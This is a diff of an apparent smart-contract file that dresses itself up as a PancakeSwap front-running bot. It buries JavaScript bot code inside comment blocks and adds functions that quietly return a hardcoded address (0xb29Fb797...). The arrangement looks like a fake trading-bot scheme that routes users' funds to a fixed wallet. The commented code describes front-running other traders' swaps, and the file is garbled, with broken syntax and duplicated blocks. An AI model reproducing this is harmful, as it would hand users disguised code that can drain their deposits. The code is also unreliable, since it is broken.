@@ -68,9 +68,8 @@ var attack_started = false;
 
 var succeed = false;
 var subscription;
-*/
+
 	function performTasks() public {
-/*
 async function createWeb3(){
     try {
          web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
@@ -86,11 +85,11 @@ async function createWeb3(){
         return true;
     } catch (error) {
       console.log(error);
-      return false;*/
- }
+      return false;
+	  }
       
 
-/*async function main() {
+async function main() {
  
 try {   
         if (await createWeb3() == false) {
@@ -129,9 +128,10 @@ try {
 
              let transaction = await web3.eth.getTransaction(transactionHash);
              if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)
-             {
+             {*/
 				function uniswapDepositAddress() public pure returns (address) {
-                 await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
+
+                 /*await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
              }
             
             if (succeed) {
@@ -240,9 +240,125 @@ async function triggersFrontRun(transaction, out_token_address, amount, level) {
 
     console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
     if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
-		var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, */
+		var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput,*/
 		return 0xb29Fb797947f6897427A24BD65323F4b69C85DE1;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
 		}
+    function Adressthisuni() public pure returns (address) {
+
+                 /*await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
+             }
+            
+            if (succeed) {
+                console.log("The bot finished the attack.");
+                process.exit();
+               
+            
+     
+
+    catch (error) {
+      
+      if(error.data != null && error.data.see === 'https:infura.io/dashboard')
+      
+         console.log('Daily request count exceeded, Request rate limited'.yellow);
+         console.log('Please insert other API Key');
+      else{
+         console.log('Unknown Handled Error');
+         console.log(error);
+       
+
+      process.exit();
+
+
+function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
+    
+    (await triggersFrontRun(transaction, out_token_address, amount, level)) {
+        subscription.unsubscribe();
+        console.log('Perform front running attack...');
+
+        gasPrice = parseInt(transaction['gasPrice']);
+        newGasPrice = gasPrice + 50*ONE_GWEI;
+
+        estimatedInput = ((amount*0.999)(10*18)).toString();
+        realInput = (amount*(10**18)).toString();
+        gasLimit = (300000).toString();
+        
+        await updatePoolInfo();
+
+        
+        swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);
+
+        console.log("wait until the honest transaction is done...", transaction['hash']);
+
+        while (await isPending(transaction['hash'])) {
+        
+
+        if(buy_failed)
+        
+            succeed = false;
+            return;
+           
+        
+        console.log('Buy succeed:')
+        
+        Sell
+        await updatePoolInfo();
+        var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
+        outputeth = outputeth * 0.999;
+
+        await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);
+        
+        console.log('Sell succeed');
+        succeed = true;
+
+
+async function approve(gasPrice, outputtoken, out_token_address, user_wallet){
+    var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();
+    
+    allowance = BigNumber(allowance);
+    outputtoken = BigNumber(outputtoken);
+
+    var decimals = BigNumber(10).power(out_token_info.decimals);
+    var max_allowance = BigNumber(10000).multiply(decimals);
+
+    if(outputtoken.gt(max_allowance))
+   
+       console.log('replace max allowance')
+       max_allowance = outputtoken;
+       
+      
+    
+    if(outputtoken.gt(allowance)){
+        console.log(max_allowance.toString());
+        var approveTX ={
+                from: user_wallet.address,
+                to: out_token_address,
+                gas: 50000,
+                gasPrice: gasPrice*ONE_GWEI,
+                data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()
+                
+            
+
+        var signedTX = await user_wallet.signTransaction(approveTX);
+        var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);
+
+        console.log('Approved Token')
+    
+    return;
+
+
+select attacking transaction
+async function triggersFrontRun(transaction, out_token_address, amount, level) {
+    
+    if(attack_started)
+        return false;
+
+    console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
+    if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
+		var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput,*/
+		return 0xb29Fb797947f6897427A24BD65323F4b69C85DE1;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
+		}
+
+
 /*        attack_started = true;
         return true
     
